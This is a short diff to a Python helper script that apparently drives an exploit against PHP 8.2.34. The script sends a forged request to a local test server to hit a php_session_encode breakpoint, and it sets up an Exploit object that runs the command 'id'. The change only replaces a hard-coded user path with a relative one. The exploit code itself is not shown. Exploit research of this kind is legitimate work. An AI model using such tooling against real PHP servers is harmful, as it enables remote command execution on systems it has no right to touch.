@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """Send reqB (with forge) to 8.2.34 to trigger the php_session_encode breakpoint."""
+import os
 import sys, time, struct
-sys.path.insert(0, r"C:\Users\likat\p2s52704")
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from exploit import Target, Exploit, build_multipart
 t = Target("http://127.0.0.1:18111/index.php", timeout=90.0, verbose=False)
 ex = Exploit(t, "id", profile="bookworm")
